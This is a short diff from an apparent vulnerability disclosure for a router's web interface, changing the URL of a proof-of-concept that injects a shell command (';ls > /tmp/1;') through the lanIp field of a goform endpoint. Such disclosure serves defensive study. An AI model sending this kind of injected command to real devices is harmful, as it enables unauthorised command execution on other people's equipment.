@@ -25,7 +25,7 @@ lan.ip get value from lanIp, and we can execute arbitrary command
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/fromAdvSetLanip"
+url = "http://192.168.1.13/goform/AdvSetLanip"
 payload = ';ls > /tmp/1;' + '\n'
 
 r = requests.post(url, data={'lanIp': payload})
